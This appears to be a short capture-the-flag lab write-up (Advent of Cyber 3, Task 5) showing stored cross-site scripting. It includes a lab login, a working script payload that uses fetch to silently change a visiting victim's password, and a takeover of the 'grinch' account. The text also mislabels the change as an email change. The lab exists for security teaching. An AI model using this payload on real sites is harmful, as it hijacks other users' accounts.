# XSS Vulnerability

[!If you want to check my notes about IDORs](https://github.com/itKhalid143/websec365/blob/main/Days/Day10-XSS.md)

***
## First we're logging using the given Credentials!

```php
Username: McSkidy

Password: password
```
![****](/Advent%20of%20Cyber%203/Screenshots/Task5/login.PNG)

## Then we're hopping to a blog to inject our malicious script!
```js
<script>fetch('/settings?new_password=pass123');</script>
``` 
```js
<script>/* */</script> #Allows use to run Javascripts inside our page
```
```fetch``` function makes a network request to the specified URL.

![****](/Advent%20of%20Cyber%203/Screenshots/Task5/1.PNG)

Once the target visist the the blog we posted it, the code will automatically make a request using fetch function to given link to change the email address!

![****](/Advent%20of%20Cyber%203/Screenshots/Task5/2.PNG)

## Here we're see how our command is injected in the source code!

## Lately we're logging with the new password we set in our malicious code!

```php
Username: grinch

Password: pass123
```
![****](/Advent%20of%20Cyber%203/Screenshots/Task5/3.PNG)

## Well done Hackers!